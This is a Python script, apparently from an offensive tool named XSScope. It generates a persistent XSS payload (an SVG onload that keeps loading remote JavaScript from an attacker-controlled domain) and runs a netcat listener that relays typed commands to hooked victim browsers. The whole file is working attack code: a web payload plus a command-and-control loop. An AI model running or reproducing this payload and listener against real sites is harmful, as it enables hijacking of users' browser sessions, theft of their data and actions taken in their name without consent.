#!/usr/bin/env python3
import socket
import os
import time
import sys
from subprocess import Popen,PIPE,STDOUT,call

o = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
o.connect(("0.0.0.0", 1338))
LH = "0.0.0.0"
o.close()
LP = '1338'

print("Listening for any connection on port 1338...")

#getting the domain name so it can generate the payload
server_conf = open("config/tcpserver_domain.txt", "r")
domain = str(server_conf.read())
xss_payload = '<svg/onload=setInterval(function(){d=document;z=d.createElement("script");z.src="//' + domain + '";d.body.appendChild(z)},0)>'
print("\n[*]Your payload is ready:\n" + xss_payload)

def shell():
    os.system('printf "xsscope:~$ "; read c; echo "$c" | timeout 1 nc -lp %s >/dev/null;' % LP)
    shell()

def status():
    proc=Popen('timeout 1 nc -lp %s' % LP, shell=True, stdout=PIPE, )
    response = str(proc.communicate()[0])
    if 'Accept' in response:
        print (response.replace('\\r\\n', '\n').replace('b\'', '')[:-3])
        print ('\nA new XSScope session is opened\n')
        shell()
    else:
        time.sleep(2)
        status()

status()

try:
	status()
	shell()
except KeyboardInterrupt:
	print ('\n[!] Keyboard Interrupt.')
	exit()
